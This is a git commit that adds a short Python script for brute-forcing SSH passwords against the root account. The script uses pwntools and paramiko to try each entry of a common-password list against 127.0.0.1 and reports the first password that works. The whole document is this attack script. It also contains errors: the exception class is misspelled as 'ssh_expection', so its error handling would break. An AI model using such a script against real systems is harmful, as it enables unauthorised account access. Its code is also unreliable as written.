cf50d77760fdc0424c1faf96d5a5d4e1964dd302
Rohan karki <100342753+hackerwhale@users.noreply.github.com>
2023-07-03 13:34:09 +0545

    Add ssh-login-pyscript

---
+++ ssh-login-bruteforcing-script.py
@@ -0,0 +1,21 @@
+from pwn import *
+import paramiko
+
+host = "127.0.0.1"
+username = "root"
+attempts = 0
+
+with open("ssh-common-passwords.txt", "r") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        try:
+            print("[{}] Attempting passowrd: '{}'!". format(attempts, password))
+            response = ssh(host=host, user=username, password=password, timeout=1)
+            if response.connected():
+                print("[>] Valid password found: '{}'!".format(password))
+                response.close()
+                break
+            response.close()
+        except paramiko.ssh_expection.AuthenticationException:
+            print("[X] Invalid password!")
+            attempts +=1            
